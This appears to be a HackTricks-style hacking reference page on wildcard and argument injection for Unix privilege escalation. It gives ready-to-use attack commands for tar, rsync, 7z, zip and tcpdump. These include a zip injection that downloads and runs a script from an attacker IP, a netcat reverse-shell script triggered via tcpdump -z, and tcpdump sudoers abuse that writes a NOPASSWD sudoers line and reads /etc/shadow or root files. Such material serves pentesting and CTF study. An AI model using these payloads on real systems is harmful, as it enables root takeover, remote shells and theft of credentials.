# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.  
> Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.  
> This page collects the most useful primitives, recent research and modern detections for 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:

```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```

When root later executes something like:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).  
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands by abusing the **checkpoint** feature:

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.

### bsdtar / macOS 14+

The default `tar` on recent macOS (based on `libarchive`) does *not* implement `--checkpoint`, but you can still achieve code-execution with the **--use-compress-program** flag that allows you to specify an external compressor.

```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
When a privileged script runs `tar -cf backup.tar *`, `/bin/sh` will be started. 

---

## rsync

`rsync` lets you override the remote shell or even the remote binary via command-line flags that start with `-e` or `--rsync-path`:

```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag spawns your shell on the remote side.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Even when the privileged script *defensively* prefixes the wildcard with `--` (to stop option parsing), the 7-Zip format supports **file list files** by prefixing the filename with `@`.  Combining that with a symlink lets you *exfiltrate arbitrary files*:

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

If root executes something like:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **printing the contents to stderr**.

---

## zip

Two very practical primitives exist when an application passes user-controlled filenames to `zip` (either via a wildcard or by enumerating names without `--`).

- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). If you can inject filenames that start with `-`, split the flags across distinct filenames so short-options parsing works:

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notes
- Do NOT try a single filename like `'-T -TT <cmd>'` — short options are parsed per character and it will fail. Use separate tokens as shown.
- If slashes are stripped from filenames by the app, fetch from a bare host/IP (default path `/index.html`) and save locally with `-O`, then execute.
- You can debug parsing with `-sc` (show processed argv) or `-h2` (more help) to understand how your tokens are consumed.

Example (local behavior on zip 3.0):

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).

Preconditions:

- You can influence `argv` passed to `tcpdump` (e.g., via a wrapper like `/debug/tcpdump --filter=... --file-name=<HERE>`).
- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.

Classic PoC (executes a reverse shell script from a writable path):

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1 -W 1` forces an immediate rotate after the first matching packet.
- `-z <cmd>` runs the post-rotate command once per rotation. Many builds execute `<cmd> <savefile>`. If `<cmd>` is a script/interpreter, ensure the argument handling matches your payload.

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
- Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Issues
- The `*` glob and permissive patterns only constrain the first `-w` argument. `tcpdump` accepts multiple `-w` options; the last one wins.  
- The rule doesn’t pin other options, so `-Z`, `-r`, `-V`, etc. are allowed.

Primitives
- Override destination path with a second `-w` (first only satisfies sudoers):

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal inside the first `-w` to escape the constrained tree:

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Force output ownership with `-Z root` (creates root-owned files anywhere):

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line):

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Error diagnostics often echo lines, leaking content:

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}